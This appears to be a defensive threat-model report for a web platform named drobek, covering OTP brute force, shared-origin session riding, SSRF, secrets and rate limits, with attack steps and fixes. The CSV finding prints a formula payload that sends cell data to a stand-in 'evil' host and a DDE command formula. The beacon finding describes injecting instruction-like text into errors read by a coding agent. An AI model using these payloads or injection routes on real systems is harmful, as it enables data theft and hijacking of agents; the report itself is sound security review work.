# PHY-76 Threat-Model Report — drobek

_Pre-design-partner security review. Surface: OAuth 2.1 Authorization Server, SSRF-guarded BFF proxy + envelope crypto, Data API, tenant isolation, audit log, agent error beacon, and the shared-origin serving model. 10 confirmed findings (each survived an adversarial refutation pass); 3 candidate findings were refuted as false-positives and dropped._

## 1. Executive summary

drobek's posture is **workable but not yet design-partner-ready for untrusted authors**. Of 10 confirmed findings there are **2 high**, **3 medium**, and **5 low**. The dominant structural risk is the **shared-origin serving model**: untrusted, vibecoded apps are served from the same origin as the dashboard, Data API, and BFF proxy, and the `drobek_session` cookie (HttpOnly, `Path=/`, `SameSite=Lax`) is attached to every same-origin credentialed `fetch` from app JS — an accepted M0–M1a residual (PHY-98/U11) that is nonetheless an active act-as-user and cross-tenant read/write/secret-exfil primitive. The **single most urgent item** is the **OTP login-code brute force**: the 5-attempt cap is enforced by a non-atomic read-modify-write with no verify-side rate limit, so a concurrent guess flood cracks the 10⁶ code space and mints a victim session — an unauthenticated full account takeover that must be fixed before onboarding. The two high findings share a root cause enough that the origin split (PHY-98/U11) plus an atomic OTP counter would retire most of the real risk.

## 2. Severity table

| Severity | Title | Category | File:line |
|---|---|---|---|
| HIGH | OTP login-code lockout is non-atomic with no verify-side rate limit → brute-forceable ATO | crypto / auth | `packages/auth/src/email-code.server.ts:90` |
| HIGH | Untrusted hosted apps run same-origin as the dashboard and ride `drobek_session` | tenant-isolation | `packages/serving/src/serve.server.ts:16` |
| MEDIUM | Shared-origin app JS drives the authenticated Data API as the viewing member (confused deputy) | csrf | `packages/data/src/resolve.server.ts:67` |
| MEDIUM | Client-spoofable `X-Forwarded-For` defeats per-IP rate limits (OTP + beacon) | rate-limit | `packages/auth/src/email-code.server.ts:108` |
| MEDIUM | CSV export does not neutralize spreadsheet formula injection | injection | `packages/data/src/columns.ts:148` |
| LOW | Dynamic Client Registration unauthenticated + unlimited (client bloat + consent-phishing names) | abuse / oauth | `packages/oauth/src/routes/oauth.register.ts:27` |
| LOW | Placeholder master key & upload-signing secret accepted at runtime | secrets | `packages/proxy/src/crypto.server.ts:47` |
| LOW | App-access unlock cookie cannot be revoked after password change (12h lag) | crypto | `packages/serving/src/password.ts:87` |
| LOW | BFF proxy allows any destination port → outbound relay/scan of public host:port | ssrf | `packages/proxy/src/validate.ts:136` |
| LOW | Unauthenticated beacon lets anyone poison another tenant's `app_errors` buffer | abuse | `packages/insights/src/beacon.server.ts:52` |

## 3. Findings

### [HIGH] OTP login-code lockout is a non-atomic counter with no verify-endpoint rate limit → brute-forceable account takeover

**What / where.** `consumeEmailLoginCode` (`packages/auth/src/email-code.server.ts:90`) is the sole defense against guessing the 6-digit (10⁶-space) numeric login code. It enforces the 5-attempt cap with a read-modify-write: `GET rec` (line 73) → compare → `rec.attempts += 1` (line 91) → `SET` (line 99), with `await` boundaries and no atomicity. The verify path (`packages/auth/src/routes/login.verify.server.ts` → tenancy wrapper → stock RR handler in `apps/web`) adds **no** IP or per-account rate limit; `otp-guard.server.ts` throttles only code **sends** (`login.server.ts:79`), not verifications.

**Attack.** An unauthenticated attacker POSTs `/login` with `victim@example.com`, generating a live code (`attempts=0`). They then fire thousands of concurrent `POST /login/verify` requests with distinct guesses. Because concurrent requests all read the same low `attempts` before any write back (last-writer-wins keeps the counter below `CODE_MAX_ATTEMPTS=5`), the `r.del()` invalidation never fires and the code absorbs guesses for its full 600s TTL. A match yields `createUserSession(victim)` — and `ensureUserByEmail` auto-provisions — i.e. full account takeover of any email.

**Mitigation.** Make the counter atomic (Redis `INCR` or a Lua increment-then-check) so the Nth failure is authoritative regardless of concurrency and deletes the code. Add an IP- and per-account rate limit on `/login/verify` (mirror `otp-guard`) so verifications are bounded independent of the per-code counter. Defense in depth: raise code entropy to 8+ digits or alphanumeric.

**Confidence.** Medium (verdict: real, high severity — full verify call path independently re-read; no backstop middleware exists).

### [HIGH] Untrusted hosted apps run same-origin as the dashboard and ride the `drobek_session` cookie

**What / where.** Untrusted apps are served from the **same origin** as everything else: `serve.app.ts` (apps), `me.tsx`/`workspaces.*.tsx` (dashboard), `serve.app.data.*.ts` (Data API), and `proxy.$name.ts` (BFF) all live in one app on one host (`packages/serving/src/serve.server.ts:16`). `drobek_session` is HttpOnly + `SameSite=Lax` + `Path=/` (`session.server.ts:52-67`): HttpOnly blocks JS **reading** the cookie, but the browser still **attaches** it to every same-origin `fetch`, and `SameSite=Lax` is inert same-origin. CSP ships `script-src 'unsafe-inline'` (`csp.ts:26`) and `connect-src 'self'`, so injected app JS runs with full same-origin authority and can call first-party endpoints. `handleProxyRequest` (`route.server.ts:43-79`) authenticates purely on `getSessionUser(request)` with no CSRF/Origin/Sec-Fetch check.

**Attack.** A malicious workspace author deploys an app (or lands stored XSS in any hosted app). When a logged-in user opens `https://drobek.app/wsA/app/evil`, its JS issues credentialed `fetch('/me')`, `fetch('/wsVictim/app/x/data/collection', {method:'POST'})`, and `fetch('/wsVictim/api/proxy/name/...')` — all carrying `drobek_session`. The proxy checks the **victim's** membership and injects that workspace's **decrypted** upstream secret, exfiltrating third-party credentials cross-tenant. Full act-as-user takeover from untrusted hosted content.

**Mitigation.** Serve hosted apps from a distinct origin (per-workspace `<ws>.apps.drobek.app`) so the dashboard session cookie is never same-origin with untrusted app JS; scope the session cookie to the dashboard host only. This is the planned PHY-98/U11 fix. Until then, treat every hosted app as fully privileged and do not host untrusted authors.

**Confidence.** High. Documented as accepted residual (`serve.server.ts:16-18`, `csp.ts:16-22`) — documentation is not a mitigation. Kept high (not critical) only because it needs a logged-in victim to navigate to malicious/compromised content.

### [MEDIUM] Untrusted hosted app JS on the shared origin can drive the authenticated Data API as the viewing member (confused deputy)

**What / where.** The same-origin REST Data API authenticates writes purely from the ambient `drobek_session` cookie via `resolveRestCaller` (`packages/data/src/resolve.server.ts:67-79`), which derives caller identity solely from the cookie and returns the victim's real `getMembership` role. No CSRF token, no Origin/Referer check, no bearer requirement on the write path (`rest.server.ts:84`, `serve.app.data.$collection[.$id].ts`). `decideDataAccess` (`access.ts`) grants editor+ writes to that role.

**Attack.** A victim who is admin of workspace A opens any drobek-hosted app (attacker's own, or one with stored XSS). The app's inline JS (`script-src 'unsafe-inline'`, `connect-src 'self'`) issues `fetch('/A/app/internal/data/secrets/<id>', {method:'DELETE', credentials:'include'})`; the cookie rides along and the delete/patch/post succeeds **as the victim** in a workspace and collection the attacker never joined. Reads can be staged into the attacker's own same-origin public-write collection to sidestep `connect-src 'self'`; destructive writes work directly.

**Mitigation.** Bring forward the origin split (PHY-98/U11), or stop trusting the ambient cookie on Data API writes: require the OAuth bearer, or enforce a CSRF token / custom non-simple header set only by first-party dashboard code.

**Confidence.** Medium. This is a same-origin confused deputy (not classic cross-site CSRF), so `SameSite=Lax` gives no protection; the in-code comment at `csp.ts:16-22` documents this exact residual. Tempered by needing an authenticated victim, known ws/app/collection identifiers, and being an acknowledged early-stage residual.

### [MEDIUM] Client-spoofable X-Forwarded-For defeats per-IP rate limits (OTP + beacon)

**What / where.** `getClientIp` (`packages/auth/src/email-code.server.ts:108`, body 107-113) returns the **leftmost** XFF entry: `xff.split(',')[0]`, falling back to `X-Real-IP` only when XFF is absent. Production nginx (`drobek-web.conf:129`, `drobek-mcp.conf:107`) sets `X-Forwarded-For $proxy_add_x_forwarded_for`, which **prepends** the client-sent value and appends the real peer — so the leftmost value is fully attacker-controlled, and since nginx always sets XFF the trustworthy `X-Real-IP` (`$remote_addr`) is never consulted.

**Attack.** The attacker sends each OTP request with a fresh spoofed `X-Forwarded-For: <random-ip>`, getting a new per-IP bucket every time and voiding the per-IP OTP gates (`otp-guard.server.ts:172-205`, normally 20 sends/24h/IP). From one host they push ~100 sends/h across ~34 emails (3/h each) into the global hourly brake (`otp-guard.server.ts:242-269`), which auto-pauses **all** email logins for 15 minutes — a repeatable, self-inflicted login DoS for every user — plus per-IP-throttle-free email probing.

**Mitigation.** Never key rate limits on a client-settable header. Derive the client IP as the rightmost untrusted hop after a configured trusted-proxy count, or read the real peer socket in the app server and pass it down. nginx already sets a trustworthy `X-Real-IP = $remote_addr` — prefer it.

**Confidence.** Medium. Availability impact is real but time-bounded/self-healing and alarmed; per-email backstops limit victim-targeted bombing. The beacon half is largely mitigated by an IP-independent per-app aggregate cap (`beacon.server.ts:57-71`) evaluated before the per-IP cap; the OTP core stands on its own.

### [MEDIUM] CSV export does not neutralize spreadsheet formula injection

**What / where.** `csvEscape` (`packages/data/src/columns.ts:148-150`) applies only RFC-4180 quoting for `[",\r\n]`; it does not neutralize leading formula triggers (`=`, `+`, `-`, `@`, tab, CR). `csvRow`/`csvLine`/`csvHeader` serialize raw record strings (`columns.ts:76-83, 94-106, 152-165`), and the Data-tab export route (`...export-csv.server.ts:83-91`) streams them to the admin as an attachment. Records in a **public-write** collection are anonymously writable (`access.ts:70` returns `{ok:true}` unconditionally), so cell content is attacker-controlled. RFC quoting does not help: Excel/LibreOffice strip surrounding quotes on import and still parse a leading `=`.

**Attack.** An anonymous attacker POSTs a record with a string field like `=HYPERLINK("http://evil/?"&A1,"click")` or DDE `=cmd|'/c calc'!A0`. When the admin exports and opens the CSV, the formula executes in the admin's context — data exfil via HYPERLINK, or command exec via DDE.

**Mitigation.** In `csvEscape`, prefix any cell whose first character is `=` `+` `-` `@` (or tab/CR) with a single quote (or force-quote and prepend `'`) so spreadsheets treat it as literal text. Apply the same guard to the Activity CSV export.

**Confidence.** Medium. Requires the admin to open the file in a spreadsheet app, and modern Excel/LibreOffice surface DDE/external-link warnings, so it is not unconditional RCE. Chain fully verified end-to-end.

### [LOW] Dynamic Client Registration is unauthenticated with no rate limit (unbounded client rows + consent-phishing names)

**What / where.** `POST /oauth/register` (`packages/oauth/src/routes/oauth.register.ts:27`, mounted bare at `routes.ts:73`) accepts any `client_name` + https `redirect_uris` from an anonymous caller and inserts a persistent `oauthClients` row via `createClient` (`clients.server.ts:26`) with no auth, CAPTCHA, or rate limit. Limiters exist only in the proxy/data/insights/auth packages, never in `packages/oauth`; `/oauth/token` and `/oauth/authorize` are also unlimited, and there is no global RR middleware. No cap on `client_name` length or `redirect_uris` count. The attacker-supplied `client_name` renders verbatim on the consent screen (`oauth.authorize.tsx {clientName}` — React-escaped, so no XSS, but lookalike names like "drobek Official" are possible).

**Attack.** Script millions of registrations to bloat the table (storage/DoS), and/or register a trusted-looking client to phish a victim into approving a grant whose code is delivered to the attacker's `redirect_uri`.

**Mitigation.** Add IP/global rate limits to register (and token/authorize); cap `client_name` length and `redirect_uris` count/length; consider requiring an authenticated session to register, or curating/flagging display names shown on consent.

**Confidence.** Medium (verdict: real, low severity). RFC 7591 permits open registration by design; the phishing prong needs social engineering + victim consent. Hardening/availability, not an authz bypass.

### [LOW] Placeholder master key and upload-signing secret are accepted at runtime

**What / where.** drobek ships as self-hostable open-core. `.env.example` ships `DROBEK_MASTER_KEY=change-me-generate-with-openssl-rand-hex-32` (line 177) and `UPLOAD_SIGNING_SECRET=change-me-...` (line 110). `kekFromEnv` (`packages/proxy/src/crypto.server.ts:47-75`) rejects only empty/`<32`-char values — the 43-char placeholder passes the passphrase branch and is SHA-256-folded into a fully-known KEK. `requireSecret` (`upload-token.ts:30`) and `mintAppAccessToken` (`password.ts`) only check non-empty. No startup guard rejects the known placeholder, despite the module comment claiming it "fails CLOSED."

**Attack.** A self-hoster copies `.env.example` → `.env` without regenerating. An attacker who knows the public placeholder can: (a) forge app-access unlock cookies via `mintAppAccessToken(appId, placeholderSecret)`, bypassing every password-protected app; (b) mint valid `PUT /__upload/<token>` tokens to write arbitrary blobs; (c) with DB read on `upstream_secrets`, derive the KEK and decrypt every stored upstream credential.

**Mitigation.** Fail closed at startup if either secret equals a known placeholder or lacks entropy (reject the `change-me` prefix, require 64 hex chars, refuse low-entropy passphrases). Prefer requiring the hex form and rejecting passphrase-derived KEKs in production. Enforce, don't just comment.

**Confidence.** Medium (verdict: real, downgraded to low). Insecure-default-initialization (CWE-1188/1394); strictly conditional on the operator ignoring the self-documenting instruction. No defect against a correctly-configured instance.

### [LOW] App-access unlock cookie cannot be revoked — password change leaves a 12h grant

**What / where.** The stateless app-access cookie is `HMAC(UPLOAD_SIGNING_SECRET, 'appaccess.' + base64url({appId, exp}))` with a 12h TTL (`mintAppAccessToken`, `packages/serving/src/password.ts:87-103`). `verifyAppAccessToken` (`password.ts:106-141`) checks signature, `appId`, and expiry only — never `apps.password_hash`. The serve gate (`serve.server.ts:156-161`) derives `hasAppAccess` solely from this token. The payload binds no password version / rotation epoch, so changing or removing the app password does not invalidate outstanding cookies.

**Attack.** The owner shares an app password, then changes it to revoke a specific viewer. The viewer's browser still holds a valid HMAC cookie and retains access to the private app for the remainder of the 12h TTL.

**Mitigation.** Bind a per-app password version (or a random per-password "access epoch" stored on the `apps` row) into the signed payload and verify it each request, so rotating/removing the password invalidates all prior cookies immediately. Reduce TTL as defense in depth.

**Confidence.** Medium (verdict: real, low). Bounded 12h window; requires prior legitimate access. Note: the token is **non-revocable**, not forgeable (the secret is not known here); the substantive defect is revocation lag.

### [LOW] BFF proxy allows any destination port — outbound relay/scan of arbitrary public host:port

**What / where.** `validateBaseUrl` (`packages/proxy/src/validate.ts:136-164`) enforces http(s), no userinfo, no localhost, and rejects private/reserved IP literals — but never inspects `url.port`. The connect-time guard `ssrfSafeForward` (`ssrf.server.ts:77-96`) classifies only the resolved IP and ignores the port. Upstream registration is self-serve (`canConfigureUpstreams` admits a workspace-admin, i.e. any signed-up user), and any member can invoke it (`canCallProxy`, `authz.ts:23-29`, `route.server.ts:68`).

**Attack.** A user signs up, creates a workspace, and registers `http://scan-target.example:6379` (or `:25`, `:22`, `:3306`). Any member calls `/:ws/api/proxy/:name/*`, making drobek's server connect out to that host:port using drobek's egress IP, laundering traffic and probing non-HTTP services on arbitrary public hosts. Private/reserved IPs remain blocked, so drobek's internal network is not reachable.

**Mitigation.** Restrict upstream destinations to standard web ports at registration in `validateBaseUrl` (default 80/443, or operator-configurable `PROXY_ALLOWED_PORTS`), and re-assert the port in `ssrf.server.ts` alongside IP classification so it is enforced at connect time too.

**Confidence.** Medium (verdict: real, low). Modest impact: node's HTTP client speaks HTTP, so non-HTTP services yield parse failures (only connect-signal leaks); not an anonymous open relay; per-request rate limit curbs mass scanning.

### [LOW] Unauthenticated error beacon lets anyone poison another tenant's app_errors buffer the agent reads

**What / where.** `recordBeacon` (`packages/insights/src/beacon.server.ts:52`) resolves the target app solely from `(wsSlug, appSlug)` in the public URL via `resolveLiveApp` (called **without** `requireWorkspaceId`), with no auth, no proof the beacon originated from that app's runtime, and no visibility gate — any live app, including a private/team app with a known slug, is targetable. The "same-origin" note (`rest.server.ts:6`) is descriptive, not enforced. `sanitizeEvent`/`redact` strip PII/secrets and truncate but do not neutralize attacker-chosen prose. These events are surfaced verbatim to the owner's coding agent via the `app_errors` MCP tool.

**Attack.** The attacker discovers a deployed app URL and POSTs `/ws/app/slug/__beacon` batches of fabricated errors with misleading/instruction-like message/stack text. The per-app aggregate cap is 600/min (`limits.ts:19`) while the ring buffer keeps newest 500 (`limits.ts:22`) and prunes by `created_at desc`, so a flood evicts the owner's genuine recent errors within one window; the owner's agent then reads attacker-controlled events (agent-loop context injection).

**Mitigation.** Keep the beacon unauthenticated but reduce spoofability and blast radius: add an Origin/Referer weak filter, mark agent-facing error text as untrusted in the `app_errors` tool output, keep per-app caps tight, and reserve buffer capacity / dedup-weight by source so floods cannot fully evict the owner's genuine errors.

**Confidence.** Medium (verdict: real, low). Error telemetry is inherently attacker-influenceable, the agent should treat error text as untrusted, and impact is limited to degrading/poisoning a diagnostic buffer — no data read, privesc, or cross-tenant data exposure.

## 4. STRIDE-style coverage map

| Reviewed surface | Primary STRIDE lens | Findings raised | Residual risk after mitigations |
|---|---|---|---|
| OAuth AS (register / token / authorize) | Spoofing, DoS | 1 (DCR unauth + unlimited, LOW) | Low — open registration is by-design; residual is abuse/phishing pending rate limits + name curation |
| SSRF proxy + envelope crypto | Info disclosure, EoP, Tampering | 2 (any-port SSRF LOW; placeholder KEK/HMAC LOW) | Low–moderate — private IPs already blocked; port allow-list and fail-closed secret checks close the gaps |
| Data API (collections/records) | Tampering, Repudiation, EoP | 2 (shared-origin confused-deputy MED; CSV formula injection MED) | Moderate until origin split + cookie-independent write auth; CSV fix is self-contained |
| Tenant isolation / shared origin | EoP, Info disclosure | 2 (same-origin session HIGH; confused deputy MED) | High until PHY-98/U11 origin split — the dominant structural risk |
| Authentication (OTP login) | Spoofing, EoP | 2 (non-atomic OTP counter HIGH; spoofable XFF MED) | High until atomic counter + verify-side rate limit; then low |
| Audit log (actor_kind) | Repudiation | 0 | Low — no confirmed defect; XFF spoofing can degrade IP attribution in adjacent logs |
| Agent error beacon | Tampering, DoS, injection | 1 (unauth cross-tenant poisoning LOW) | Low — treat agent-facing error text as untrusted; reserve buffer capacity |
| Serving / shared-origin CSP | EoP, Info disclosure | (covered under tenant isolation) | High — `unsafe-inline` + `Path=/` cookie; resolved by origin split |

## 5. Recommended remediation order

**MUST block the design partner (untrusted authors / real users on prod):**

1. **[HIGH] Atomic OTP counter + verify-side rate limit** (`email-code.server.ts:90`) — replace read-modify-write with Redis `INCR`/Lua; add IP + per-account limits on `/login/verify`. Closes unauthenticated ATO. _Do first._
2. **[HIGH] Origin split for hosted apps** (PHY-98/U11; `serve.server.ts:16`) — serve apps from `<ws>.apps.drobek.app`, scope `drobek_session` to the dashboard host. Retires the same-origin session-riding primitive **and** the Data API confused deputy (#3) in one move. If the split cannot land in time, **do not host untrusted authors** and treat every app as fully privileged.

**Should fix before or immediately alongside onboarding:**

3. **[MEDIUM] Data API cookie-independent write auth** (`resolve.server.ts:67`) — subsumed by the origin split; if that slips, require OAuth bearer or a CSRF/custom-header on Data API writes as an interim.
4. **[MEDIUM] Trustworthy client IP** (`email-code.server.ts:108`) — stop trusting leftmost XFF; use `X-Real-IP`/rightmost trusted hop. Restores every per-IP limit and login-DoS resistance.
5. **[MEDIUM] CSV formula-injection guard** (`columns.ts:148`) — prefix `=`/`+`/`-`/`@`/tab/CR cells with `'`; apply to Data and Activity exports. Small, self-contained.

**Hardening — schedule post-onboarding:**

6. **[LOW] Fail closed on placeholder secrets** (`crypto.server.ts:47`) — reject `change-me` prefix / require 64 hex / entropy floor at startup. Important before publishing self-host docs to a partner.
7. **[LOW] OAuth register/token/authorize rate limits + `client_name` length cap** (`oauth.register.ts:27`).
8. **[LOW] Proxy port allow-list** (`validate.ts:136`) — default 80/443, re-assert in `ssrf.server.ts`.
9. **[LOW] App-access cookie epoch binding** (`password.ts:87`) — per-password epoch in the signed payload; shorten TTL.
10. **[LOW] Beacon blast-radius controls** (`beacon.server.ts:52`) — Origin filter, untrusted-text labeling in `app_errors`, reserved buffer capacity.

_Fastest path to partner-ready: items 1 and 2 are the gate; 3–5 fold in cheaply (3 for free with 2). Items 6–10 are backlog hardening that do not block onboarding provided authors are trusted/curated at launch._